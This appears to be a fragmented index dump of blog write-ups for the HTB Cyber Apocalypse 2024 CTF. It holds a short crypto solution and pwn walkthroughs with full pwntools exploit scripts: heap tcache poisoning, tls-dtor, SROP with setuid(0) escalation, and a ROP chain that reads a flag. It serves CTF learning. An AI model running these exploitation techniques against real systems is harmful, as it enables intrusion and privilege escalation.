to_identity_map(a): return ord(a) - 0x41 def from_identity_map(a): return chr(a % 26 + 0x41) def encrypt(m): c = '' for i in range(len(m)): ch = m[i] if not ch.isalpha(): ech = ch else: chi = to_identity_map(ch) ech = from_identity_map(chi + i) c += ech return c with open('output.txt', 'w') as f: f.write('Make sure you wrap the decrypted text with the HTB flag format :-]\\n') f.write(encrypt(FLAG)) The encryption here is quite straightforward, where it encrypt the text by shifting it based on the current character index. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:10:1","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":"Solution We can easily make the decrypt method which try to shift back the encrypted character by its position. Below is the script that I used to solve this challenge: def to_identity_map(a): return ord(a) - 0x41 def from_identity_map(a): return chr(a % 26 + 0x41) def decrypt(c): m = '' for i in range(len(c)): ch = c[i] if not ch.isalpha(): dm = ch else: chi = to_identity_map(ch) dm = from_identity_map(chi - i) m += dm return m flag = decrypt('DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL') print(f'HTB{{{flag}}}') Flag: HTB{DID_YOU_KNOW_ABOUT_THE_TRITHEMIUS_CIPHER?!_IT_IS_SIMILAR_TO_CAESAR_CIPHER} Social Media Follow me on twitter ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-crypto/:10:2","tags":["Writeup","Cyber Apocalypse","htb","crypto","preimage","tea","backtracking","permutations"],"title":"Cyber Apocalypse 2024: Crypto","uri":"/posts/cyber-apocalypse-2024-crypto/"},{"categories":null,"content":" HackTheBox - Cyber Apocalypse 2024: Hacker Royale I have been casually participating in the Cyber Apocalypse CTF 2024. During this time, I managed to solve all the challenges in the pwn, crypto, blockchain, and hardware categories. In this write-up, I will share my solutions for all the challenges in the pwn category that I solved. If you are interested in reading the write-up for all the blockchain \u0026 hardware challenges, check out this post. If you are interested in reading the write-up for all the crypto challenges, check out this post. I managed to solve all of the pwn, crypto, blockchain, and hardware challenges by myself :) Pwn ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:0:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Gloater [insane] Description One thing that the overlords at KORP™ know best is the sheer sadistic value of taunting opponents. Throughout The Fray, onlookers can eagerly taunt and deride the contestants, pushing them mentally and breaking their will. By the end of the psychological torture, little of what was once human remains. You have come across a Gloater, one of the devices left around the Arena of The Fray. Gloaters allow you to send sardonic messages to the others, even taking on the shapes of their loved ones as the words cut deep into their psyche. But there’s another well-known effect of such a weapon - the user of the Gloater puts a target on his back, as contestants from all factions swear to destroy the one who uses it. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:1:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary named gloater. The first step involved checking the binary’s mitigation techniques to understand the security measures in place. Keeping these mitigations in mind will be crucial as we proceed. Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Next, we began disassembling the binary to explore its key functions. main int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [rsp+Ch] [rbp-94h] BYREF char v5[136]; // [rsp+10h] [rbp-90h] BYREF int (**v6)(const char *); // [rsp+98h] [rbp-8h] setup(argc, argv, envp); v6 = \u0026puts; libc_start = (__int64)(\u0026puts - 58438); libc_end = (__int64)(\u0026puts + 182202); printf(\"Enter User\\nDo not make a mistake, or there will be no safeguard!\\n\u003e \"); read(0, user, 0x10uLL); v4 = 0; while ( 1 ) { printf( \"1) Update current user\\n\" \"2) Create new taunt\\n\" \"3) Remove taunt\\n\" \"4) Send all taunts\\n\" \"5) Set Super Taunt\\n\" \"6) Exit\\n\" \"\u003e \"); __isoc99_scanf(\"%d\", \u0026v4); switch ( v4 ) { case 1: change_user(); break; case 2: create_taunt(); break; case 3: remove_taunt(); break; case 4: send_taunts(); case 5: set_super_taunt(v5); break; default: exit(0); } } } During the initial phase, the binary calls a setup function. Let’s delve into the setup function’s implementation to see what it entails. setup __int64 (__fastcall *setup())() { __int64 (__fastcall *result)(); // rax setvbuf(stdin, 0LL, 2, 0LL); setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); alarm(0x7Fu); old_malloc_hook = _malloc_hook; _malloc_hook = (__int64)my_malloc_hook; old_free_hook = _free_hook; result = my_free_hook; _free_hook = (__int64)my_free_hook; return result; } void *__fastcall my_malloc_hook(size_t a1) { void *v2; // [rsp+18h] [rbp-8h] _malloc_hook = old_malloc_hook; _free_hook = old_free_hook; v2 = malloc(a1); old_malloc_hook = _malloc_hook; old_free_hook = _free_hook; validate_ptr(v2); _malloc_hook = (__int64)my_malloc_hook; _free_hook = (__int64)my_free_hook; return v2; } __int64 (__fastcall *__fastcall my_free_hook(void *a1))() { __int64 (__fastcall *result)(); // rax _malloc_hook = old_malloc_hook; _free_hook = old_free_hook; validate_ptr(a1); free(a1); old_malloc_hook = _malloc_hook; old_free_hook = _free_hook; _malloc_hook = (__int64)my_malloc_hook; result = my_free_hook; _free_hook = (__int64)my_free_hook; return result; } __int64 __fastcall validate_ptr(unsigned __int64 a1) { __int64 result; // rax result = libc_start; if ( a1 \u003e= libc_start ) { result = libc_end; if ( a1 \u003c= libc_end ) { puts(\"Did you really think?\"); exit(-1); } } return result; } Upon examining the setup function, it became apparent that the binary substitutes the standard malloc and free functions with its own hooks. These custom hooks introduce a check to determine if the pointers returned by malloc or passed to free fall within the libc address range. If a pointer is within this range, the operation is reverted, adding a layer of security. Returning to the main function, we noticed it establishes the boundaries for libc_start and libc_end, setting up the address range for these checks. Furthermore, the binary presents 5 menus for interaction, indicating multiple functionalities or actions we can explore. Let’s proceed by examining each menu option’s implementation to understand how we can interact with the binary and potentially identify vulnerabilities or exploit paths. change_user int change_user() { int result; // eax char buf[20]; // [rsp+0h] [rbp-20h] BYREF int v2; // [rsp+14h] [rbp-Ch] int i; // [rsp+18h] [rbp-8h] int v4; // [rsp+1Ch] [rbp-4h] if ( user_changed ) { puts(\"You have already changed the User. There is only one life.\"); exit(0); } puts(\"Setting the User is a safeguard against getting destroyed\"); printf(\"New User: \"); v2 = read(0, buf, 0x10uLL); v4 = 1; for ( i = 0; i \u003c= 15; ++i ) { if ( buf[i] == 32 ) { v4 = 0; break; } } printf(\"Old User was %s...\\n\", user); if ( v4 ) { strcpy(user, \"PLAYER FROM TH","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:1:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Solution In summary, we’ve identified two critical vulnerabilities: The super_set_taunt function enables us to leak a libc address. The change_user function suffers from overflow issues, allowing for partial overwriting of the taunts array entries. First, let’s establish our helper functions to simplify the process. from pwn import * exe = ELF(\"gloater_patched\") libc = ELF(\"./libc-2.31.so\") ld = ELF(\"./ld-2.31.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = \"94.237.54.48\" remote_port = 47636 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() menu_delim = b'\u003e ' def logbase(): info('libc.address = %#x' % libc.address) def logleak(name, val): info(name+' = %#x' % val) def sa(delim,data): return r.sendafter(delim,data) def sla(delim,line): return r.sendlineafter(delim,line) def sl(line): return r.sendline(line) def so(data): return r.send(data) def sn(num): return str(num).encode() def menu(num): return sla(menu_delim, sn(num)) def change_user(new_user): menu(1) sa(b': ', new_user) def create(target, taunt): menu(2) sa(b': ', target) sa(b': ', taunt) def delete(idx): menu(3) sla(b': ', sn(idx)) def set_super_taunts(idx, val): menu(5) sla(b': ', sn(idx)) sa(b': ', val) r.recvuntil(b': ') return r.recvline().strip() # Before getting to the menu, we need to put initial name name = b'test' sa(b'\u003e ', name) Given that we can easily obtain a libc leak, our next step involves leveraging the second vulnerability (overwriting the taunts array) to achieve code execution. Firstly, note that the program allows us to exit. There are known methods that exploit how glibc manages the exit process to execute code, suggesting we can adopt one of these methods here. I have chosen to utilize the tls-dtor method (More details on this method can be found here). To exploit the tls-dtor, we must allocate a chunk within the tls area (given the tls area’s constant offset from the libc address, we can calculate the exact target address), and then write to the tls area. To allocate a chunk in the tls area, one strategy involves poisoning the tcache freelist. Therefore, our focus shifts to how we can manipulate the tcache freelist. The approach that I’ve selected for this challenge involves creating a fake chunk and aiming to free this fake chunk. To accomplish this, we exploit the change_user bug by modifying the least significant byte of the first element in the taunts array to point to our fake_chunk. Subsequently, invoking remove_taunt will free this fake_chunk. For a clearer understanding, refer to the following code and examine the heap layout. payload = p64(0)+p64(0x71) payload = payload.ljust(0x30, b'a') create(b'a'*8, payload) payload = p64(0)+p64(0xd1) create(b'a'*8, payload.ljust(0xd0, b'a')) create(b'b'*8, b'b'*0xd0) Executing the provided code results in the following heap layout: 0x55555555b290: 0x0000000000000000 0x0000000000000031 0x55555555b2a0: 0x0000000000000000 0x0000000000000000 0x55555555b2b0: 0x0000000000000000 0x0000000000000000 0x55555555b2c0: 0x000055555555b2d0 0x0000000000000041 0x55555555b2d0: 0x0000000000000000 0x0000000000000071 \u003c- Our fake chunk 0x55555555b2e0: 0x6161616161616161 0x6161616161616161 0x55555555b2f0: 0x6161616161616161 0x6161616161616161 0x55555555b300: 0x0000000000000000 0x0000000000000031 0x55555555b310: 0x0000000000000000 0x0000000000000000 0x55555555b320: 0x0000000000000000 0x0000000000000000 0x55555555b330: 0x000055555555b340 0x00000000000000e1 0x55555555b340: 0x0000000000000000 0x00000000000000d1 0x55555555b350: 0x6161616161616161 0x6161616161616161 0x55555555b360: 0x6161616161616161 0x6161616161616161 0x55555555b370: 0x6161616161616161 0x6161616161616161 0x55555555b380: 0x6161616161616161 0x6161616161616161 0x55555555b390: 0x6161616161616161 0x6161616161616161 0x5555555","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:1:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Maze of Mist [hard] Description As you stride into your next battle, an enveloping mist surrounds you, gradually robbing you of eyesight. Though you can move, the path ahead seems nonexistent, leaving you stationary within the confines of your existence. Can you discover an escape from this boundless stagnation? ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:2:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we’re provided with a zip file containing a qemu setup to execute the target binary, named target, located within initramfs.cpio.gz. To extract initramfs.cpio.gz, follow these steps: gunzip initramfs.cpio.gz mkdir tmp-root cd tmp-root cpio -idv \u003c ../initramfs.cpio Now, let’s try to disasemble the target binary. It is a 32-bit binary. ; Attributes: noreturn public _start _start proc near mov eax, 4 mov ebx, 1 ; fd mov ecx, offset prompt ; \"Where to go, challenger? your fractured\"... mov edx, 4Ah ; 'J' ; len int 80h ; LINUX - sys_write call _vuln mov eax, 1 xor ebx, ebx ; status int 80h ; LINUX - sys_exit _start endp _text ends ------------------------------------ _vuln proc near addr= byte ptr -20h mov eax, 3 xor ebx, ebx ; fd lea ecx, [esp+addr] ; addr mov edx, 200h ; len int 80h ; LINUX - sys_read xor eax, eax retn _vuln endp Reviewing the assembly of target, there’s a clear buffer overflow in the _vuln function. However, the binary is small, limiting our exploitation options. Examining the init script reveals that ASLR is disabled, and flag.txt is located in the /root folder. Additionally, the target binary’s SUID bit is set. #!/bin/sh export PS1='\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ' chown -R root:root / chmod 0700 /root mount -t proc none /proc mount -t sysfs none /sys mount -t devpts -o gid=5,mode=0620 devpts /dev/pts mount -t devtmpfs -o nosuid,mode=0755 udev /dev chmod 0400 /root/flag.txt chmod u+s /target hostname arena echo 0 \u003e/proc/sys/kernel/randomize_va_space setsid cttyhack setuidgid 1000 /bin/sh umount /proc \u0026\u0026 umount /sys poweroff -d 0 -f Now that we’ve checked the target binary and the init script, let’s try to think on how to exploit this. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:2:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Solution To simplify the exploitation process, we first modify the init script for root access by changing setuidgid 1000 to setuidgid 0, then repack it. Here’s how my modified run.sh looks, automatically repacking the filesystem before starting qemu. #!/bin/sh rm -rf debugfs.cpio cd tmp-root; find . -print0 | cpio -o --null --format=newc --owner=root \u003e ../debugfs.cpio cd ../ qemu-system-x86_64 \\ -m 128M \\ -nographic \\ -kernel \"./vmlinuz-linux\" \\ -append \"console=ttyS0 quiet loglevel=3 oops=panic panic=-1 pti=on kaslr\" \\ -monitor /dev/null \\ -initrd \"./debugfs.cpio\" \\ -cpu qemu64,+smep,+smap,+rdrand \\ -smp cores=2 \\ -gdb tcp::12345 After running the binary in qemu and inspecting its memory mapping, we observe a static vdso area. root@arena:/# ./target \u0026 root@arena:/# Where to go, challenger? your fractured reflection is your only guide. \u003e ps aux | grep target 73 root 0:00 ./target 75 root 0:00 grep target [1]+ Stopped (tty input) ./target root@arena:/# cat /proc/73/maps 08048000-08049000 r--p 00000000 00:02 5 /target 08049000-0804a000 r-xp 00001000 00:02 5 /target 0804a000-0804b000 rw-p 00002000 00:02 5 /target f7ff8000-f7ffc000 r--p 00000000 00:00 0 [vvar] f7ffc000-f7ffe000 r-xp 00000000 00:00 0 [vdso] fffdd000-ffffe000 rw-p 00000000 00:00 0 [stack] I manually dumped the vdso with the below command to identify usable gadgets. dd if=/proc/73/mem bs=1 skip=$((0xf7ffc000)) count=8192 2\u003e/dev/null | od -v -t x8 The above will dump the vdso bytes. I parsed the output with the below script to convert it to a valid vdso.so binary. from pwn import * lines = open('vdso_dump', 'rb').readlines() data = b'' for line in lines: a, b = line.strip().split(b' ')[1:] data += p64(int(a.decode(), 16)) + p64(int(b.decode(), 16)) with open ('vdso.so', 'wb') as f: f.write(data) f.close() Now we have the vdso_dump, let’s check for good gadgets on it. One particular gadget found in the vdso_dump, 0x00000591: mov eax, 0x77; int 0x80;. Taking a look at the syscall table, this is actually a SIGRETURN syscall, which mean we can do SROP. pwntools has a good helper that can help us easily setup the SigreturnFrame, which mean this will be enough for us to do a basic ROP of: setuid(0) We need to do this because /root/flag.txt is owned by root, which is kinda a privilege escalation challenge via SUID. execve('/bin/cat', '/root/flag.txt') This will read the flag However, I encountered several challenges during exploitation. The first issue relates to qemu interpreting specific bytes as commands rather than binary input. To circumvent this, we escape all characters with \\x16 (e.g., to send aaa, it’s encoded as \\x16a\\x16a\\x16a), and utilize \\x04 to flush input instead of using a newline. Secondly, the sigreturn syscall consistently failed in qemu. Upon observing via gdb, it is due to the stack pointer being too close to the stack’s end. To resolve this, I used another vdso gadget, 0x00000b7c: pop ebp; cld; leave; ret;, for stack pivoting, effectively moving the stack pointer away from the end. This approach facilitated a successful SROP execution. Below is the exploit script with detailed comments: from pwn import * exe = ELF('./target') context.arch = 'i386' context.kernel = 'amd64' # Gadgets int80_call_vuln = 0x8049029 vdso_base = 0xf7ffc000 sigreturn = vdso_base+0x591 pop_ebp_leave_ret = vdso_base+0x00000b7c # Connection # r = process('./run.sh') r = remote('83.136.251.145', 57764) # Run target pause() r.sendlineafter(b'$ ', b'./target') # Reduce stack so that sigreturn will work info(f'Reduce stack to make sigreturn successful') curr_esp = 0xffffde4c # Retrieved from gdb (remember no ASLR) for i in range(13): # Return to _start. payload = (b'\\x16\\x15\\x90\\x16\\x04\\x08')*8 payload += p32(pop_ebp_leave_ret) payload += p32(curr_esp) # This will make on iteration, the program pivot to address near our payload (which will make the program return to _start) info(f'Curr iteration: {i}...') sleep(0.5) r.send(payload+b'\\x04') curr_esp -= 0x1c # Sigreturn to do setuid(0)","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:2:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Oracle [hard] Description Traversing through the desert, you come across an Oracle. One of five in the entire arena, an oracle gives you the power to watch over the other competitors and send infinitely customizable plagues upon them. Deeming their powers to be too strong, the sadistic overlords that run the contest decided long ago that every oracle can backfire - and, if it does, you will wish a thousand times over that you had never been born. Willing to do whatever it takes, you break it open, risking eternal damnation for a chance to turn the tides in your favour. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:3:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given the source code. oracle.c // gcc oracle.c -o oracle -fno-stack-protector #include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e #include \u003csys/socket.h\u003e #include \u003cnetinet/in.h\u003e #define PORT 9001 #define MAX_START_LINE_SIZE 1024 #define MAX_PLAGUE_CONTENT_SIZE 2048 #define MAX_HEADER_DATA_SIZE 1024 #define MAX_HEADERS 8 #define MAX_HEADER_LENGTH 128 #define VIEW \"VIEW\" #define PLAGUE \"PLAGUE\" #define BAD_REQUEST \"400 Bad Request - you can only view competitors or plague them. What else would you want to do?\\n\" #define PLAGUING_YOURSELF \"You tried to plague yourself. You cannot take the easy way out.\\n\" #define PLAGUING_OVERLORD \"You have committed the greatest of sins. Eternal damnation awaits.\\n\" #define NO_COMPETITOR \"No such competitor %s exists. They may have fallen before you tried to plague them. Attempted plague: \" #define CONTENT_LENGTH_NEEDED \"You need to specify the length of your plague description. How else can I help you?\\n\" #define RANDOMISING_TARGET \"Randomising a target competitor, as you wish...\\n\" struct PlagueHeader { char key[MAX_HEADER_LENGTH]; char value[MAX_HEADER_LENGTH]; }; struct PlagueHeader headers[MAX_HEADERS]; int client_socket; char action[8]; char target_competitor[32]; char version[16]; void handle_request(); void handle_view(); void handle_plague(); void parse_headers(); char *get_header(); int is_competitor(); int main() { int server_socket = socket(AF_INET, SOCK_STREAM, 0); if (server_socket == -1) { perror(\"Failed to create socket!\"); exit(EXIT_FAILURE); } // Set up the server address struct struct sockaddr_in server_address; server_address.sin_family = AF_INET; server_address.sin_addr.s_addr = INADDR_ANY; server_address.sin_port = htons(PORT); // Bind the socket to the specified address and port if (bind(server_socket, (struct sockaddr*)\u0026server_address, sizeof(server_address)) == -1) { perror(\"Socket binding failed\"); close(server_socket); exit(EXIT_FAILURE); } // Listen for incoming connections if (listen(server_socket, 5) == -1) { perror(\"Socket listening failed\"); close(server_socket); exit(EXIT_FAILURE); } printf(\"Oracle listening on port %d\\n\", PORT); while(1) { client_socket = accept(server_socket, NULL, NULL); puts(\"Received a spiritual connection...\"); if (client_socket == -1) { perror(\"Socket accept failed\"); continue; } handle_request(); } return 0; } void handle_request() { // take in the start-line of the request // contains the action, the target competitor and the oracle version char start_line[MAX_START_LINE_SIZE]; char byteRead; ssize_t i = 0; for (ssize_t i = 0; i \u003c MAX_START_LINE_SIZE; i++) { recv(client_socket, \u0026byteRead, sizeof(byteRead), 0); if (start_line[i-1] == '\\r' \u0026\u0026 byteRead == '\\n') { start_line[i-1] == '\\0'; break; } start_line[i] = byteRead; } sscanf(start_line, \"%7s %31s %15s\", action, target_competitor, version); parse_headers(); // handle the specific action desired if (!strcmp(action, VIEW)) { handle_view(); } else if (!strcmp(action, PLAGUE)) { handle_plague(); } else { perror(\"ERROR: Undefined action!\"); write(client_socket, BAD_REQUEST, strlen(BAD_REQUEST)); } // clear all request-specific values for next request memset(action, 0, 8); memset(target_competitor, 0, 32); memset(version, 0, 16); memset(headers, 0, sizeof(headers)); } void handle_view() { if (!strcmp(target_competitor, \"me\")) { write(client_socket, \"You have found yourself.\\n\", 25); } else if (!is_competitor(target_competitor)) { write(client_socket, \"No such competitor exists.\\n\", 27); } else { write(client_socket, \"It has been imprinted upon your mind.\\n\", 38); } } void handle_plague() { if(!get_header(\"Content-Length\")) { write(client_socket, CONTENT_LENGTH_NEEDED, strlen(CONTENT_LENGTH_NEEDED)); return; } // take in the data char *plague_content = (char *)malloc(MAX_PLAGUE_CONTENT_SIZE); char *plague_target = (char *)0x0; if (get_header(\"Plague-Target\")) { plague_target = (char *)malloc(0x40); ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:3:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Solution To begin, we’ll set up our helper functions. It’s important to remember that we’re interacting with a socket created by the program, not the program directly. This means if we make multiple connections to it, the ASLR addresses remain unchanged as long as the program isn’t restarted. from pwn import * exe = ELF(\"oracle_patched\") libc = ELF(\"./libc-2.31.so\") ld = ELF(\"./ld-2.31.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = '94.237.63.128' remote_port = 59852 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() menu_delim = b'\u003e ' def logbase(): info('libc.address = %#x' % libc.address) def logleak(name, val): info(name+' = %#x' % val) def sa(delim,data): return r.sendafter(delim,data) def sla(delim,line): return r.sendlineafter(delim,line) def sl(line): return r.sendline(line) def so(data): return r.send(data) def sn(num): return str(num).encode() def menu(num): return sla(menu_delim, sn(num)) def make_request(act, target, version): payload = act + b' ' + target + b' ' + version + b'\\r\\n' so(payload) def make_headers(headers): payload = b'' for key, val in headers.items(): payload += (key+b': '+val+b'\\r\\n') payload += b'\\r\\n' so(payload) def make_raw_headers(payload): so(payload+b'\\r\\n'*2) Our first step is to obtain a libc leak. We can achieve this by making a PLAGUE request twice, following the strategy I outlined earlier. # Trigger unsorted bin free make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa') headers = { b'Plague-Target': b'a'*0x10, b'Content-Length': b'8' } make_headers(headers) so(b'a') pause() old_r = r # Get libc leak r = conn() make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa') headers = { b'Plague-Target': b'a'*0x10, b'Content-Length': b'8' } make_headers(headers) so(b'a') r.recvuntil(b'plague: ') libc.address = u64(r.recv(8)) - 0x1ecb61 logleak('libc.address', libc.address) pause() old_r = r With the libc leak in hand, we can now proceed to craft our ROP chain to read the flag by abusing the buffer-overflow bug in the parse_headers function. The ROP chain I’ve designed follows a basic open-read-write pattern, ultimately writing the flag to our socket descriptor. I added an extra read step to the chain to read flag.txt into a chosen address in the libc writable area. Here is the complete code for the exploit. from pwn import * exe = ELF(\"oracle_patched\") libc = ELF(\"./libc-2.31.so\") ld = ELF(\"./ld-2.31.so\") context.binary = exe context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") remote_url = '94.237.63.128' remote_port = 59852 gdbscript = ''' ''' def conn(): if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r, gdbscript=gdbscript) pause() else: r = remote(remote_url, remote_port) return r r = conn() menu_delim = b'\u003e ' def logbase(): info('libc.address = %#x' % libc.address) def logleak(name, val): info(name+' = %#x' % val) def sa(delim,data): return r.sendafter(delim,data) def sla(delim,line): return r.sendlineafter(delim,line) def sl(line): return r.sendline(line) def so(data): return r.send(data) def sn(num): return str(num).encode() def menu(num): return sla(menu_delim, sn(num)) def make_request(act, target, version): payload = act + b' ' + target + b' ' + version + b'\\r\\n' so(payload) def make_headers(headers): payload = b'' for key, val in headers.items(): payload += (key+b': '+val+b'\\r\\n') payload += b'\\r\\n' so(payload) def make_raw_headers(payload): so(payload+b'\\r\\n'*2) # Trigger unsorted bin free make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa') headers = { b'Plague-Target': b'a'*0x10, b'Content-Length': b'8' } make_headers(headers) so(b'a') pause() old_r = r # Get libc leak r = conn() make_request(b'PLAGUE', b'bbbb', b'aaaaaaaa') headers = { b'Plague-Target': b'a'*0x10, b'Content-Length': b'8' ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:3:2","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Sound of Silence [medium] Description Navigate the shadows in a dimly lit room, silently evading detection as you strategize to outsmart your foes. Employ clever distractions to divert their attention, paving the way for your daring escape! ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:4:0","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Initial Analysis In this challenge, we were given a binary called sound_of_silence. Let’s try to disassemble the binary. int __cdecl main(int argc, const char **argv, const char **envp) { char v4[32]; // [rsp+0h] [rbp-20h] BYREF system(\"clear \u0026\u0026 echo -n '~The Sound of Silence is mesmerising~\\n\\n\u003e\u003e '\"); return gets(v4, argv); } As we can see, this challenge involves another buffer overflow vulnerability. Let’s examine the binary’s mitigations: ╰─❯ checksec sound_of_silence Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) We can see that it is a No PIE binary, which means we don’t need an address leak to exploit it. Let’s move on to crafting the solution. ","date":"Mar 14, 2024","objectID":"/posts/cyber-apocalypse-2024-pwn/:4:1","tags":["Writeup","Cyber Apocalypse","htb","pwn","heap","bof","rop","qemu","srop","tls-dtor"],"title":"Cyber Apocalypse 2024: Pwn","uri":"/posts/cyber-apocalypse-2024-pwn/"},{"categories":null,"content":"Solution First, we examine the disassembled code of the main function. main endbr64 push rbp mov rbp, rsp sub rsp, 20h lea rax, command ; \"clear \u0026\u0026 echo -n '~The Sound of Silence\"... mov rdi, rax ; command call _system lea rax, [rbp+var_20] mov rdi, rax mov eax, 0 call _gets nop leave retn We notice an instruction mov rdi, rax; call _system. Next, we observe the register values in gdb just before our program executes the ret instruction. Breakpoint 1, 0x0000000000401184 in main () [ Legend: Modified register | Code | Heap | Stack | Writable | ReadOnly | None | RWX | String ] ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- registers ---- $rax : 0x00007fffffffd6d0 -\u003e 0x0068732f6e69622f ('/bin/sh'?) $rbx : 0x0000000000000000 $rcx : 0x00007ffff7e1aaa0 \u003c_IO_2_1_stdin_\u003e -\u003e 0x00000000fbad2088 $rdx : 0x0000000000000001 $rsp : 0x00007fffffffd6f8 -\u003e 0x0000000000401184 \u003cmain+0x2e\u003e -\u003e 0xfa1e0ff3000000c3 $rbp : 0x0000000000404060 -\u003e 0x0000000000000000 $rsi : 0x0000000000000001 $rdi : 0x00007ffff7e1ca80 \u003c_IO_stdfile_0_lock\u003e -\u003e 0x0000000000000000 $rip : 0x0000000000401184 \u003cmain+0x2e\u003e -\u003e 0xfa1e0ff3000000c3 $r8 : 0x0000000000000000 $r9 : 0x0000000000000000 $r10 : 0x0000000000000077 $r11 : 0x0000000000000246 $r12 : 0x00007fffffffd808 -\u003e 0x00007fffffffdc44 -\u003e './sound_of_silence' $r13 : 0x0000000000401156 \u003cmain\u003e -\u003e 0xe5894855fa1e0ff3 $r14 : 0x0000000000403dd0 \u003c__do_global_dtors_aux_fini_array_entry\u003e -\u003e 0x0000000000401120 \u003c__do_global_dtors_aux\u003e -\u003e 0x2ee53d80fa1e0ff3 $r15 : 0x00007ffff7ffd040 \u003c_rtld_global\u003e -\u003e 0x00007ffff7ffe2e0 -\u003e 0x0000000000000000 $eflags: 0x202 [ident align vx86 resume nested overflow direction INTERRUPT trap sign zero adjust parity carry] [Ring=3] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- stack ---- 0x7fffffffd6f8|+0x0000|+000: 0x0000000000401184 \u003cmain+0x2e\u003e -\u003e 0xfa1e0ff3000000c3 \u003c- retaddr[0], $rsp 0x7fffffffd700|+0x0008|+001: 0x0000000000401184 \u003cmain+0x2e\u003e -\u003e 